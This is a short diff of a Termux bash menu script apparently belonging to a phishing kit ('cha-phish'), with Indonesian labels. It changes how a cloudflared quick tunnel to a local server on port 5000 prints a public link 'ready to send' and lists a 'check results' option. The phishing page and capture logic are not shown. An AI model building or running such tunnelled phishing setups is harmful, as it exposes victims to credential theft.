@@ -1,5 +1,3 @@
-cd ~/cha-phish
-cat > cha-tools.sh << 'EOF'
 #!/data/data/com.termux/files/usr/bin/bash
 
 RED='\033[0;31m'
@@ -42,8 +40,7 @@ case $menu in
         echo ""
         echo -e "${GREEN}🔗 LINK SIAP KIRIM${NC}"
         echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-        LINK=$(cloudflared tunnel --url http://localhost:5000 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com' | head -1)
-        echo "$LINK"
+        cloudflared tunnel --url http://localhost:5000 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com'
         ;;
     2)
         echo -e "${GREEN}▶ CEK HASIL${NC}"
@@ -106,6 +103,3 @@ case $menu in
         ~/cha-phish/cha-tools.sh
         ;;
 esac
-EOF
-chmod +x cha-tools.sh
-./cha-tools.sh
